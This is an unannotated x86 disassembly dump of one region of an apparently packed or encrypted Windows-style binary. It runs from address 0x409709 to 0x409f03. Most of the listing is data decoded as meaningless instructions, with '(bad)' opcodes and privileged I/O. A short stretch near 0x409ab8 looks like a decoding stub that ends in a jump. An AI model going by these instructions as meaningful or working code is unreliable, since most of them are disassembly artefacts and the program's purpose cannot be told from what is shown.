  409709:	mov    bl,0xc9
  40970b:	cld    
  40970c:	rcl    dh,cl
  40970e:	ins    BYTE PTR es:[edi],dx
  40970f:	lods   eax,DWORD PTR ds:[esi]
  409710:	js     0x409783
  409712:	daa    
  409713:	jp     0x4096e2
  409715:	outs   dx,BYTE PTR ds:[esi]
  409716:	sub    ecx,DWORD PTR [eax-0x61]
  409719:	fadd   DWORD PTR [ecx+0x6bbc7a58]
  40971f:	loop   0x4096f4
  409721:	rol    BYTE PTR [edx],1
  409723:	dec    ebx
  409724:	ss mov ebx,0x393097ba
  40972a:	test   BYTE PTR [ebp+0x51cede9a],al
  409730:	xchg   esp,eax
  409731:	jns    0x40976b
  409733:	in     al,0x69
  409735:	mov    edx,ebp
  409737:	push   esi
  409738:	mov    bh,0x1d
  40973a:	adc    eax,0x40219d51
  40973f:	stc    
  409740:	shr    DWORD PTR [esi],1
  409742:	add    eax,0x285541d1
  409747:	push   edi
  409748:	sahf   
  409749:	jl     0x4096fc
  40974b:	xor    ebp,DWORD PTR [ebx+0x7d]
  40974e:	inc    ecx
  40974f:	cmp    esi,DWORD PTR [edi-0x13]
  409752:	sti    
  409753:	in     eax,dx
  409754:	pusha  
  409755:	xor    al,0x3f
  409757:	jne    0x409711
  409759:	cmp    al,0x4c
  40975b:	mov    bl,0xa2
  40975d:	cld    
  40975e:	pop    ss
  40975f:	add    dh,BYTE PTR [esi+0x26]
  409762:	jb     0x40975d
  409764:	mov    WORD PTR [ecx+edx*1+0x75],fs
  409768:	mov    ecx,0x87c7dd4b
  40976e:	repz mov ch,0xde
  409771:	mov    cl,0x3
  409773:	call   0xd2ad:0xc3459650
  40977a:	jno    0x409796
  40977c:	cmp    al,0x87
  40977e:	mov    eax,0x376edd76
  409783:	pop    ebx
  409784:	sub    ebx,ecx
  409786:	push   0x6b
  409788:	jb     0x40971d
  40978a:	mov    dh,0x0
  40978c:	sbb    eax,0xb5225aa8
  409791:	mov    edi,0xcccc36e1
  409796:	and    eax,0x518e56e6
  40979b:	test   DWORD PTR [ebx-0x4d4f890c],eax
  4097a1:	mov    cl,BYTE PTR ds:0x458a373
  4097a7:	cmp    al,0x49
  4097a9:	xor    esi,DWORD PTR [edi+0x60]
  4097ac:	mov    WORD PTR [edi+ebp*4-0x73],ds
  4097b0:	jle    0x40977b
  4097b2:	mov    DWORD PTR [edx-0x44b11af4],esp
  4097b8:	test   DWORD PTR [esi+eax*1],0xc9e8428e
  4097bf:	jle    0x4097b0
  4097c1:	mov    ebp,0xc90e0b33
  4097c6:	xchg   ebp,eax
  4097c7:	cmp    dh,dl
  4097c9:	pop    ds
  4097ca:	and    esp,edx
  4097cc:	inc    esi
  4097cd:	stos   BYTE PTR es:[edi],al
  4097ce:	int    0x83
  4097d0:	mov    ch,0xe2
  4097d2:	mov    ds,WORD PTR [ebx]
  4097d4:	div    BYTE PTR [eax+0x66ceced]
  4097da:	push   0xffffff98
  4097dc:	mov    bl,0xa1
  4097de:	xchg   ebp,eax
  4097df:	xchg   esp,eax
  4097e0:	xchg   ecx,eax
  4097e1:	cmp    edi,ecx
  4097e3:	es push esi
  4097e5:	pop    ss
  4097e6:	push   ds
  4097e7:	fimul  DWORD PTR [eax+edx*2]
  4097ea:	pop    edx
  4097eb:	pushf  
  4097ec:	sub    BYTE PTR [edx],ah
  4097ee:	je     0x40983b
  4097f0:	mov    ah,0x73
  4097f2:	leave  
  4097f3:	fist   WORD PTR [eax+0xe]
  4097f6:	imul   edx,DWORD PTR ds:[edi],0xffffffb6
  4097fa:	adc    ecx,DWORD PTR [esi-0x7d8b24cf]
  409800:	addr16 ds (bad) 
  409803:	shl    DWORD PTR [edx],cl
  409805:	loope  0x40978c
  409807:	jp     0x40984d
  409809:	je     0x409835
  40980b:	cmp    BYTE PTR [ebp+0x5e],bh
  40980e:	or     eax,0xc460ce1f
  409813:	mov    ?,WORD PTR [edi]
  409815:	scas   al,BYTE PTR es:[edi]
  409816:	stos   BYTE PTR es:[edi],al
  409817:	inc    ebp
  409818:	bound  ecx,QWORD PTR [edx+0x5f]
  40981b:	dec    ebp
  40981c:	sub    al,0xc8
  40981e:	jl     0x409854
  409820:	and    BYTE PTR [edx+0x691654a5],bl
  409826:	ficom  DWORD PTR [edi]
  409828:	adc    BYTE PTR [edi+0x165c8efd],dl
  40982e:	mov    esi,0xccf2bffa
  409833:	pop    esi
  409834:	fiadd  WORD PTR [ebx+0x1c58a524]
  40983a:	dec    esp
  40983b:	sub    dl,BYTE PTR [ecx+eax*4+0x612b63b3]
  409842:	ret    0x4190
  409845:	xor    BYTE PTR [edi],ah
  409847:	pop    ds
  409848:	mov    cl,BYTE PTR [ebp-0x2d]
  40984b:	push   ebx
  40984c:	inc    esi
  40984d:	dec    esp
  40984e:	jne    0x409868
  409850:	ret    
  409851:	push   edx
  409852:	lahf   
  409853:	push   ds
  409854:	lock fnstsw WORD PTR [edx]
  409857:	jb     0x4097e7
  409859:	xchg   BYTE PTR [ebx],ah
  40985b:	rcr    DWORD PTR [edi+0x29],0xd0
  40985f:	icebp  
  409860:	icebp  
  409861:	mov    ebp,0x2ed5e70d
  409866:	nop
  409867:	mov    BYTE PTR [eax],dl
  409869:	push   esi
  40986a:	add    bh,BYTE PTR [eax-0x8]
  40986d:	mov    ebx,DWORD PTR [eax]
  40986f:	in     al,0x44
  409871:	ffreep st(5)
  409873:	push   ds
  409874:	loope  0x4098c8
  409876:	jmp    0x40982d
  409878:	dec    esi
  409879:	sar    DWORD PTR [eax-0x5d20d3b7],1
  40987f:	call   0xc2ab:0xd6140bbd
  409886:	cs mov ebx,0x5ad52884
  40988c:	xchg   esp,eax
  40988d:	mov    al,0xa6
  40988f:	popa   
  409890:	out    dx,eax
  409891:	adc    esi,esp
  409893:	sub    esi,ecx
  409895:	jmp    0x25f36b39
  40989a:	adc    DWORD PTR [edi+0x33],ecx
  40989d:	xor    eax,0x837cbe4d
  4098a2:	inc    esi
  4098a3:	mov    al,ds:0x6f0f74cc
  4098a8:	loop   0x4098f4
  4098aa:	stc    
  4098ab:	pop    esp
  4098ac:	mov    edx,0x489ec0cf
  4098b1:	(bad)  
  4098b2:	and    BYTE PTR [edx+ebp*8],al
  4098b5:	in     al,dx
  4098b6:	data16 fistp DWORD PTR ds:0xb0027a0c
  4098bd:	cld    
  4098be:	icebp  
  4098bf:	dec    ebx
  4098c0:	popf   
  4098c1:	jb     0x4098d6
  4098c3:	pop    ebx
  4098c4:	add    ebp,edx
  4098c6:	mov    edi,0x5d0e3e40
  4098cb:	mov    ebx,0xf67e8419
  4098d0:	cld    
  4098d1:	enter  0x5849,0x2d
  4098d5:	jb     0x409865
  4098d7:	shr    ebp,0xf1
  4098da:	cwde   
  4098db:	out    0x6e,al
  4098dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098de:	jae    0x4098a1
  4098e0:	jge    0x409910
  4098e2:	jmp    0x409867
  4098e4:	xchg   edi,eax
  4098e5:	or     DWORD PTR [esi],eax
  4098e7:	(bad)  
  4098e8:	xchg   esp,eax
  4098e9:	dec    esp
  4098ea:	out    0xdd,eax
  4098ec:	retf   0x21
  4098ef:	add    edi,ebx
  4098f1:	inc    edx
  4098f2:	jle    0x409929
  4098f4:	push   es
  4098f5:	pop    ecx
  4098f6:	aas    
  4098f7:	push   ss
  4098f8:	mov    eax,0x30d412be
  4098fd:	in     al,dx
  4098fe:	xchg   BYTE PTR [eax+ebp*4],ah
  409901:	data16 fsub QWORD PTR [edx+0x21a950a6]
  409908:	pop    ds
  409909:	scas   eax,DWORD PTR es:[edi]
  40990a:	hlt    
  40990b:	mov    al,0xca
  40990d:	jge    0x4098af
  40990f:	lods   al,BYTE PTR ds:[esi]
  409910:	add    BYTE PTR [esi-0x3f269f56],ah
  409916:	gs jae 0x4098d6
  409919:	mov    ecx,0x9b8a6dc1
  40991e:	dec    edi
  40991f:	je     0x409982
  409921:	popf   
  409922:	inc    eax
  409923:	mov    ds:0x745f0747,eax
  409928:	add    ah,dl
  40992a:	stc    
  40992b:	test   eax,0xdd19b642
  409930:	frstpm(287 only) 
  409932:	adc    ch,BYTE PTR [esi-0x38612c99]
  409938:	daa    
  409939:	repz dec ecx
  40993b:	jno    0x4099a6
  40993d:	xor    al,0xe8
  40993f:	push   edx
  409940:	fs popf 
  409942:	add    DWORD PTR [edi-0x4bacb8ca],0xd12398c9
  40994c:	stos   BYTE PTR es:[edi],al
  40994d:	lahf   
  40994e:	cld    
  40994f:	pop    edx
  409950:	mov    ds:0x4c9da27b,eax
  409955:	popa   
  409956:	sbb    BYTE PTR [esi+0x50],dl
  409959:	std    
  40995a:	ret    0x1a2e
  40995d:	mov    edx,0xa54f17f9
  409962:	daa    
  409963:	mov    esi,0x31d04dcc
  409968:	daa    
  409969:	retf   
  40996a:	cmp    al,0xb9
  40996c:	inc    esp
  40996d:	push   cs
  40996e:	adc    BYTE PTR [ebx+0x7f961239],ch
  409974:	data16 fsub DWORD PTR [eax-0x12d3a87d]
  40997b:	jo     0x4099ee
  40997d:	mov    ch,0xa2
  40997f:	inc    ecx
  409980:	fisub  DWORD PTR [eax-0x5485d627]
  409986:	arpl   WORD PTR [ebx+0x4073aaac],ax
  40998c:	(bad)  
  40998d:	jmp    ebp
  40998f:	out    0x29,eax
  409991:	xchg   ecx,eax
  409992:	inc    ebp
  409993:	jns    0x409934
  409995:	pushf  
  409996:	sbb    dh,BYTE PTR [edi+0x34]
  409999:	es jo  0x4099b4
  40999c:	mov    esp,0x91a65d09
  4099a1:	jmp    0x8a47:0x3b3f9414
  4099a8:	(bad)  
  4099a9:	jg     0x4099f9
  4099ab:	std    
  4099ac:	mov    al,0x48
  4099ae:	test   eax,esi
  4099b0:	jmp    0x409998
  4099b2:	std    
  4099b3:	iret   
  4099b4:	stc    
  4099b5:	les    ebx,FWORD PTR [ecx]
  4099b7:	inc    ecx
  4099b8:	jmp    0x1087:0x6a9a891a
  4099bf:	pop    ds
  4099c0:	sub    BYTE PTR [ebx-0x54b77de2],al
  4099c6:	popf   
  4099c7:	or     al,0xcb
  4099c9:	mov    dh,0xd1
  4099cb:	retf   0xbf0e
  4099ce:	ret    
  4099cf:	jno    0x4099ee
  4099d1:	shl    DWORD PTR [ecx+ecx*1-0x665d45b6],1
  4099d8:	mov    dh,BYTE PTR ds:0x162a9212
  4099de:	dec    ecx
  4099df:	cld    
  4099e0:	outs   dx,DWORD PTR ds:[esi]
  4099e1:	enter  0x5ef8,0xe7
  4099e5:	test   al,0x47
  4099e7:	sub    eax,0xd6d4d273
  4099ec:	jmp    0xe5e6d2bd
  4099f1:	xchg   BYTE PTR [eax-0x25c03f65],bh
  4099f7:	dec    edx
  4099f8:	add    eax,0x3273d3b9
  4099fd:	inc    edx
  4099fe:	int    0x82
  409a00:	cmc    
  409a01:	mov    bh,0x93
  409a03:	repz mov esp,0x91183cf0
  409a09:	xor    dl,cl
  409a0b:	push   edx
  409a0c:	inc    ecx
  409a0e:	stc    
  409a0f:	not    DWORD PTR [edx]
  409a11:	xchg   ecx,eax
  409a12:	bound  edx,QWORD PTR [esi-0x7b5e330d]
  409a18:	sub    eax,esi
  409a1a:	leave  
  409a1b:	ficom  DWORD PTR [edx+0x6b96beb7]
  409a21:	mov    edi,0x6bcf4461
  409a26:	push   ecx
  409a27:	dec    esi
  409a28:	pop    DWORD PTR [esi+0x52]
  409a2b:	mov    ds:0xeae634fd,eax
  409a30:	pusha  
  409a31:	dec    esp
  409a32:	sub    eax,0xd2cab24
  409a37:	jnp    0x409a69
  409a39:	mov    ds:0x1b0a0532,al
  409a3e:	mov    dl,cl
  409a40:	mov    al,al
  409a42:	cmp    dh,al
  409a44:	sbb    al,0x1c
  409a46:	and    ebx,DWORD PTR [ecx+0x28]
  409a49:	push   esi
  409a4a:	std    
  409a4b:	sbb    bl,dh
  409a4d:	cmp    BYTE PTR [ecx],cl
  409a4f:	retf   
  409a50:	lods   eax,DWORD PTR ds:[esi]
  409a51:	mov    dl,0x22
  409a53:	add    eax,0xbdbcebc3
  409a59:	push   eax
  409a5a:	jns    0x409a92
  409a5c:	xor    ecx,DWORD PTR [eax]
  409a5e:	adc    ebx,DWORD PTR [eax+edx*1]
  409a61:	pop    ecx
  409a62:	pop    edi
  409a63:	jge    0x409a5d
  409a65:	loopne 0x409a2c
  409a67:	cmp    al,0x75
  409a69:	xchg   ecx,eax
  409a6a:	retf   
  409a6b:	fs jo  0x409ac7
  409a6e:	int3   
  409a6f:	or     edi,DWORD PTR [ebp-0x6a3fff84]
  409a75:	dec    eax
  409a76:	cmp    DWORD PTR [ecx-0x4d37cee],eax
  409a7c:	xor    dl,BYTE PTR [edi]
  409a7e:	cmp    cl,dl
  409a80:	mov    esi,0x1c8284a9
  409a85:	scas   eax,DWORD PTR es:[edi]
  409a86:	cli    
  409a87:	loope  0x409ac9
  409a89:	and    cl,cl
  409a8b:	out    0xbe,al
  409a8d:	out    0x28,al
  409a8f:	scas   eax,DWORD PTR es:[edi]
  409a90:	(bad)  
  409a91:	or     edx,DWORD PTR gs:[esp+edi*2-0x562433f1]
  409a99:	add    esp,esp
  409a9b:	mov    eax,ds:0x7f1120db
  409aa0:	es mov dh,0xeb
  409aa3:	sbb    dh,BYTE PTR [edi-0x4b]
  409aa6:	sbb    eax,DWORD PTR [ecx-0x64]
  409aa9:	pushf  
  409aaa:	(bad)  
  409aab:	mov    ds:0xcdf8c5f2,al
  409ab0:	pop    edi
  409ab1:	push   ebp
  409ab2:	cdq    
  409ab3:	(bad)  
  409ab4:	into   
  409ab5:	retf   0xd536
  409ab8:	push   esi
  409ab9:	mov    ecx,DWORD PTR ds:0x422008
  409abf:	add    ecx,DWORD PTR ds:0x420e82
  409ac5:	mov    DWORD PTR ds:0x422008,ecx
  409acb:	mov    esi,0xf89c85b5
  409ad0:	mov    DWORD PTR [ebp-0xc],esi
  409ad3:	mov    edx,DWORD PTR ds:0x420f34
  409ad9:	mov    ecx,DWORD PTR ds:0x42301c
  409adf:	sub    ecx,edx
  409ae1:	sub    edx,DWORD PTR [edx+ecx*1]
  409ae4:	lea    eax,[ebp-0xc]
  409ae7:	or     ecx,edx
  409ae9:	mov    DWORD PTR [ebp-0x14],eax
  409aec:	mov    eax,DWORD PTR [ebp-0xc]
  409aef:	mov    edx,DWORD PTR [ebp-0x14]
  409af2:	sbb    DWORD PTR ds:0x420fa0,ebx
  409af8:	mov    ecx,0x7510896
  409afd:	xor    eax,ecx
  409aff:	add    eax,0x3272dd
  409b04:	mov    DWORD PTR [edx],eax
  409b06:	mov    edx,DWORD PTR ds:0x42201c
  409b0c:	sbb    DWORD PTR ds:0x420ef0,edx
  409b12:	mov    eax,ds:0x4242ad
  409b17:	mov    edx,DWORD PTR [ebp-0x4]
  409b1a:	sbb    DWORD PTR ds:0x420fac,0x420e82
  409b24:	mov    eax,DWORD PTR [eax]
  409b26:	or     DWORD PTR ds:0x420f08,0x422000
  409b30:	add    eax,DWORD PTR [edx]
  409b32:	push   edi
  409b33:	mov    DWORD PTR [ebp-0x8],eax
  409b36:	jmp    0x40beb0
  409b3b:	popa   
  409b3c:	dec    edi
  409b3d:	jmp    0x409b64
  409b3f:	mov    ebx,0xf1fba379
  409b44:	jnp    0x409bbc
  409b46:	js     0x409ae4
  409b48:	xor    DWORD PTR [eax],edx
  409b4a:	cmp    BYTE PTR [ecx],0x4
  409b4d:	jp     0x409bc9
  409b4f:	sbb    DWORD PTR [edi+0x7a],ebx
  409b52:	jp     0x409bc0
  409b54:	scas   eax,DWORD PTR es:[edi]
  409b55:	pop    esi
  409b56:	jb     0x409b37
  409b58:	and    ebp,edx
  409b5a:	push   ds
  409b5b:	gs aam 0x89
  409b5e:	rcl    cl,0x6d
  409b61:	(bad)  
  409b62:	mov    eax,0x9fb71b18
  409b67:	xor    DWORD PTR [esi],edi
  409b69:	popa   
  409b6a:	loopne 0x409b1f
  409b6c:	hlt    
  409b6d:	or     ch,ch
  409b6f:	add    bl,BYTE PTR [ebp-0x6ebea7bb]
  409b75:	or     BYTE PTR ds:0x96220850,0x46
  409b7c:	push   esi
  409b7d:	push   DWORD PTR [ecx+0x2a]
  409b80:	pop    ds
  409b81:	push   esi
  409b82:	push   esp
  409b83:	rol    BYTE PTR [ecx],1
  409b85:	cmp    ecx,DWORD PTR [esp+edx*4]
  409b88:	fadd   st(3),st
  409b8a:	mov    bh,0x90
  409b8c:	push   cs
  409b8d:	ret    0xcd12
  409b90:	add    ebx,DWORD PTR [edi-0x3d0cd29d]
  409b96:	push   cs
  409b97:	pop    eax
  409b98:	xchg   esp,eax
  409b99:	xchg   esi,ebp
  409b9b:	xchg   esp,eax
  409b9c:	aaa    
  409b9d:	emms   
  409b9f:	(bad)  
  409ba0:	jmp    0xdd29:0x8587e2a5
  409ba7:	(bad)  
  409ba8:	mov    ebx,0x5e0d3b21
  409bad:	mov    esi,0xf964e43b
  409bb2:	dec    DWORD PTR [esi-0x6385447f]
  409bb8:	shr    DWORD PTR [ecx-0x47],cl
  409bbb:	jo     0xd34fe902
  409bc1:	cmc    
  409bc2:	jecxz  0x409be8
  409bc4:	add    eax,0x62815600
  409bc9:	or     eax,0x6dec9aa8
  409bce:	inc    DWORD PTR [edi-0x239e0f74]
  409bd4:	retf   
  409bd5:	fcom   st(2)
  409bd7:	push   ebp
  409bd8:	push   ebp
  409bd9:	mov    dl,0x6c
  409bdb:	pop    ss
  409bdc:	rcl    DWORD PTR [ebp+0x76],cl
  409bdf:	pusha  
  409be0:	xchg   ecx,eax
  409be1:	cmp    bh,BYTE PTR [ebx-0x3027a181]
  409be7:	rcr    ebp,cl
  409be9:	cmp    edx,0xc
  409bec:	cmp    ah,BYTE PTR [ecx]
  409bee:	cmp    al,0xf2
  409bf0:	xchg   DWORD PTR ds:0xf4687e2d,ebp
  409bf6:	inc    ebp
  409bf7:	jns    0x409c33
  409bf9:	jns    0x409b95
  409bfb:	stc    
  409bfc:	popa   
  409bfd:	out    0xcf,al
  409bff:	cwde   
  409c00:	hlt    
  409c01:	cmp    ch,BYTE PTR ds:0xaf64cb6a
  409c07:	fwait
  409c08:	pop    edi
  409c09:	lss    esp,FWORD PTR [eax]
  409c0c:	retf   0xa96b
  409c0f:	adc    eax,0x2767e3b5
  409c14:	je     0x409c33
  409c16:	adc    bh,dh
  409c18:	cld    
  409c19:	in     eax,0x8c
  409c1b:	iret   
  409c1c:	jne    0x409c38
  409c1e:	les    esi,FWORD PTR [eax]
  409c20:	mov    cl,0xfa
  409c22:	shl    BYTE PTR [eax+edx*4+0x4ef12b52],0x35
  409c2a:	or     cl,BYTE PTR [ebx+edi*1]
  409c2d:	sbb    esi,ecx
  409c2f:	popf   
  409c30:	out    0xe,eax
  409c32:	(bad)  
  409c33:	and    DWORD PTR ds:0x4c07,edi
  409c38:	cmp    DWORD PTR [edx-0x1b],0x6d
  409c3c:	ds in  eax,0xa5
  409c3f:	jno    0x409c9e
  409c41:	std    
  409c42:	ror    DWORD PTR [esp+ebp*4+0x1f5f2ae6],1
  409c49:	cmp    BYTE PTR ds:0xc89fc204,al
  409c4f:	fdiv   st,st(4)
  409c51:	add    eax,0xc4d275ac
  409c56:	repnz cmp BYTE PTR [ebx],al
  409c59:	or     ch,BYTE PTR [ebx-0x13044888]
  409c5f:	aad    0x4f
  409c61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c62:	fwait
  409c63:	add    al,cl
  409c65:	mov    bl,0x25
  409c67:	retf   0xc1e5
  409c6a:	aad    0x86
  409c6c:	arpl   si,di
  409c6e:	push   edi
  409c6f:	cld    
  409c70:	call   0xd1a54cea
  409c75:	fwait
  409c76:	inc    esi
  409c77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c78:	ds js  0x409cc2
  409c7b:	in     al,0x59
  409c7d:	(bad)  
  409c7e:	js     0x409c2e
  409c80:	jne    0x409c8a
  409c82:	jno    0x409cd1
  409c84:	jnp    0x409c76
  409c86:	push   ss
  409c87:	stc    
  409c88:	push   ss
  409c89:	mov    esp,0x1319af5b
  409c8e:	(bad)  [ebp-0x600fef79]
  409c94:	mov    ?,WORD PTR [edx]
  409c96:	hlt    
  409c97:	std    
  409c98:	xchg   esi,eax
  409c99:	push   edx
  409c9a:	mov    BYTE PTR ds:0x4a383b5c,dl
  409ca0:	sub    al,0xa8
  409ca2:	cmc    
  409ca3:	push   esi
  409ca4:	sub    cl,dh
  409ca6:	sub    bl,ah
  409ca8:	xor    al,0xaa
  409caa:	xchg   esp,eax
  409cab:	clc    
  409cac:	fdivr  QWORD PTR [ebp+0x76]
  409caf:	scas   al,BYTE PTR es:[edi]
  409cb0:	pop    edi
  409cb1:	outs   dx,DWORD PTR ds:[esi]
  409cb2:	mov    eax,ds:0x769e2e8f
  409cb7:	aad    0x62
  409cb9:	cmp    eax,0xc7c611a8
  409cbe:	jns    0x409cad
  409cc0:	mov    eax,0x4d0b968c
  409cc5:	mov    es,eax
  409cc7:	cld    
  409cc8:	cmp    DWORD PTR [ecx*4-0x4ec0d41e],esi
  409ccf:	mov    eax,ds:0xf6151704
  409cd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cd5:	mov    bh,0xd7
  409cd7:	inc    edx
  409cd8:	lea    ecx,[edi-0x10]
  409cdb:	xor    ch,ah
  409cdd:	pavgb  mm5,mm7
  409ce0:	cmp    al,BYTE PTR [ecx]
  409ce2:	inc    esi
  409ce3:	popf   
  409ce4:	mov    ds:0x78816df8,eax
  409ce9:	inc    edi
  409cea:	push   ds
  409ceb:	repnz adc eax,0xd4d0b8e2
  409cf1:	pop    DWORD PTR ds:0x16f26763
  409cf7:	cdq    
  409cf8:	xchg   esi,eax
  409cf9:	mov    edx,0xb464751e
  409cfe:	or     BYTE PTR [ecx+0x62c6c060],cl
  409d04:	ja     0x409cab
  409d06:	jle    0x409c9c
  409d08:	or     DWORD PTR [eax],esi
  409d0a:	pop    esi
  409d0b:	ja     0x409d49
  409d0d:	or     bl,BYTE PTR [ecx-0x3d]
  409d10:	repnz loop 0x409d17
  409d13:	cli    
  409d14:	cmp    eax,0x2a5b1786
  409d19:	nop
  409d1a:	lods   al,BYTE PTR ds:[esi]
  409d1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d1c:	fwait
  409d1d:	add    eax,0x843efa9d
  409d22:	add    dh,BYTE PTR [edi]
  409d24:	pop    ds
  409d25:	fiadd  WORD PTR [ecx]
  409d27:	loop   0x409d4d
  409d29:	mov    ebp,0xab2299ca
  409d2e:	cmp    DWORD PTR [edi+0x72c4c218],edi
  409d34:	cmp    al,0xa1
  409d36:	sbb    bl,BYTE PTR [eax]
  409d38:	mov    eax,0x6934554c
  409d3d:	inc    ebx
  409d3e:	or     al,0x5b
  409d40:	jmp    0x8ad1:0xd590c6f2
  409d47:	jnp    0x409d60
  409d49:	in     al,dx
  409d4a:	mov    WORD PTR [eax+edx*2],es
  409d4d:	pop    esi
  409d4e:	cmp    dh,bl
  409d50:	call   0x83b6:0x3949333
  409d57:	and    al,0x81
  409d59:	(bad)  
  409d5a:	xor    al,0xc7
  409d5c:	loope  0x409dda
  409d5e:	std    
  409d5f:	sbb    DWORD PTR [edi-0x32],edi
  409d62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d63:	in     al,0x9e
  409d65:	ins    BYTE PTR es:[edi],dx
  409d66:	jo     0x409d6a
  409d68:	xchg   esi,eax
  409d69:	sbb    DWORD PTR [ecx-0x38ccb079],ebx
  409d6f:	imul   eax,DWORD PTR [ecx+0x5b],0xffffffcf
  409d73:	sub    bl,BYTE PTR [edx+esi*1+0x4e]
  409d77:	push   ds
  409d78:	push   ecx
  409d79:	cmp    DWORD PTR [ebx-0x384df099],0xffffffad
  409d80:	inc    edi
  409d81:	neg    DWORD PTR [edi+esi*8+0x3c6fcd06]
  409d88:	cmp    al,bh
  409d8a:	or     al,0x4e
  409d8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d8d:	scas   eax,DWORD PTR es:[edi]
  409d8e:	stos   BYTE PTR es:[edi],al
  409d8f:	ins    BYTE PTR es:[edi],dx
  409d90:	push   eax
  409d91:	mov    al,0xd6
  409d93:	nop
  409d94:	rcr    edi,0x8d
  409d97:	dec    ebp
  409d98:	into   
  409d99:	and    esp,DWORD PTR [esi]
  409d9b:	cmp    eax,0xb977af10
  409da0:	retf   0x3c2
  409da3:	dec    ebp
  409da4:	sub    eax,0x704d96b8
  409da9:	aas    
  409daa:	repz and esp,DWORD PTR [ecx-0x25]
  409dae:	push   esi
  409daf:	dec    ebx
  409db0:	and    BYTE PTR [esi-0x3c],ch
  409db3:	adc    eax,0x2368c8ed
  409db8:	mov    edi,0xb20259a
  409dbd:	icebp  
  409dbe:	out    0xd7,eax
  409dc0:	xchg   edi,eax
  409dc1:	nop
  409dc2:	addr16 call 0x669e:0xc9b37243
  409dca:	pop    ebx
  409dcb:	mov    ds:0x2f7a798c,al
  409dd0:	bound  edi,QWORD PTR [esi-0x1b228dd3]
  409dd6:	jnp    0x409db8
  409dd8:	add    BYTE PTR [eax],ah
  409dda:	pop    esp
  409ddb:	sbb    ch,cl
  409ddd:	jne    0x409dc4
  409ddf:	push   es
  409de0:	xor    DWORD PTR [ecx+0x6695a44f],edi
  409de6:	push   cs
  409de7:	bound  esi,QWORD PTR [edx-0x4d]
  409dea:	mov    ebx,0x8578d68b
  409def:	pop    edx
  409df0:	pop    esp
  409df1:	aaa    
  409df2:	pushf  
  409df3:	jecxz  0x409d9c
  409df5:	and    BYTE PTR [esp+edx*8],bh
  409df8:	pop    ebp
  409df9:	and    BYTE PTR [esi+0x7884c7d3],cl
  409dff:	dec    eax
  409e00:	js     0x409dd4
  409e02:	mov    DWORD PTR [ebp-0x4e],esp
  409e05:	inc    ecx
  409e06:	inc    eax
  409e07:	pop    edx
  409e08:	shl    DWORD PTR [ecx+0x26],0x2b
  409e0c:	add    al,0xc1
  409e0e:	pop    esi
  409e0f:	aaa    
  409e10:	call   FWORD PTR [edi*8+0x5d0af582]
  409e17:	icebp  
  409e18:	cmp    DWORD PTR [ebp-0xfb1a0a2],ebp
  409e1e:	cwde   
  409e1f:	xor    DWORD PTR [ecx+0x5e],edx
  409e22:	cmp    esi,DWORD PTR [eax-0x1a34b2d1]
  409e28:	xor    BYTE PTR [edi-0x6393cf94],cl
  409e2e:	xchg   ecx,eax
  409e2f:	pop    ebp
  409e30:	(bad)  [ecx]
  409e32:	pop    eax
  409e33:	retf   
  409e34:	rcr    BYTE PTR [edi+0x6febcbcc],cl
  409e3a:	sahf   
  409e3b:	retf   
  409e3c:	sbb    cl,al
  409e3e:	inc    ebx
  409e3f:	inc    ebp
  409e40:	imul   eax,DWORD PTR [edi+0x6e],0x8eac1081
  409e47:	dec    ecx
  409e48:	ins    BYTE PTR es:[edi],dx
  409e49:	outs   dx,BYTE PTR ds:[esi]
  409e4a:	jp     0x409e9d
  409e4c:	out    dx,eax
  409e4d:	push   ebp
  409e4e:	push   ebp
  409e4f:	push   esp
  409e50:	cwde   
  409e51:	gs xor al,0x17
  409e54:	dec    ebx
  409e55:	dec    ebx
  409e56:	das    
  409e57:	sbb    eax,0x6c2efabc
  409e5c:	mov    ecx,0x352882f
  409e61:	sbb    cl,BYTE PTR [edi-0x6f874d9e]
  409e67:	mov    al,0x91
  409e69:	pop    ds
  409e6a:	repz out 0x32,eax
  409e6d:	push   ds
  409e6e:	sbb    DWORD PTR [eax+0x70],0x2fa9a64c
  409e75:	sahf   
  409e76:	loopne 0x409ed6
  409e78:	xchg   ebx,eax
  409e79:	sbb    BYTE PTR [edi+0x510aba3f],ah
  409e7f:	mov    WORD PTR [ebx+0x6c8eac02],fs
  409e85:	stc    
  409e86:	or     ebx,DWORD PTR [edi]
  409e88:	daa    
  409e89:	dec    ecx
  409e8a:	xchg   edx,eax
  409e8b:	mov    edi,0x9e2bf002
  409e90:	sti    
  409e91:	out    dx,al
  409e92:	pusha  
  409e93:	push   es
  409e94:	dec    ebx
  409e95:	jl     0x409f00
  409e97:	xor    cl,BYTE PTR [ecx-0x13]
  409e9a:	mov    dh,0xf3
  409e9c:	imul   ebp,DWORD PTR [esi+0x20f6697a],0xffffffb1
  409ea3:	mov    al,ds:0xb99b3988
  409ea8:	xchg   edi,eax
  409ea9:	or     bl,0x44
  409eac:	xchg   ebp,eax
  409ead:	adc    bh,BYTE PTR [edi+eiz*4-0xe6e9292]
  409eb4:	out    0x2c,eax
  409eb6:	mov    WORD PTR [ebp-0x4],?
  409eb9:	stos   DWORD PTR es:[edi],eax
  409eba:	jecxz  0x409efc
  409ebc:	in     eax,dx
  409ebd:	call   0x6905:0xf4cfaa9e
  409ec4:	retf   
  409ec5:	call   0x42cb79f2
  409eca:	mov    esi,0x337d2982
  409ecf:	add    eax,ebx
  409ed1:	std    
  409ed2:	sbb    eax,0x3d070745
  409ed7:	pop    ds
  409ed8:	retf   
  409ed9:	test   esi,esi
  409edb:	mov    esi,0xbbb0f2a8
  409ee0:	pop    edi
  409ee1:	jp     0x409ef4
  409ee3:	add    ch,BYTE PTR [edx]
  409ee5:	jnp    0x409ee3
  409ee7:	sbb    edx,DWORD PTR [ecx+0x5568d099]
  409eed:	jnp    0x409f2c
  409eef:	xchg   edi,eax
  409ef0:	sbb    bh,dl
  409ef2:	mov    edi,esp
  409ef4:	push   edx
  409ef5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ef6:	jecxz  0x409e78
  409ef8:	cmp    bl,dh
  409efa:	cli    
  409efb:	mov    ebp,0x37d38c2a
  409f00:	sbb    edx,ecx
  409f02:	fwait
  409f03:	lods   al,BYTE PTR ds:[esi]
